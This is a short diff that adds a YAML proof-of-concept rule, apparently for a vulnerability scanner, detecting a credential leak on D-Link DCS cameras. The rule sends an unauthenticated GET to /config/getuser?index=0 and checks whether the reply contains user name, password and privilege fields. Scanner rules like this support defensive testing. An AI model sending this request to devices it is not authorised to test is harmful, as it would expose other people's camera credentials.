@@ -1,0 +1,9 @@
+name: poc-yaml-dlink-dcs-info-leak
+rules:
+  - method: GET
+    path: /config/getuser?index=0
+    expression: response.status == 200 && response.body.bcontains(b"name=") && response.body.bcontains(b"pass=") && response.body.bcontains(b"priv=")
+detail:
+  author: jingling(https://github.com/shmilylty)
+  links:
+    - https://mp.weixin.qq.com/s/cG868wc7dmwxFslcwlgDpw
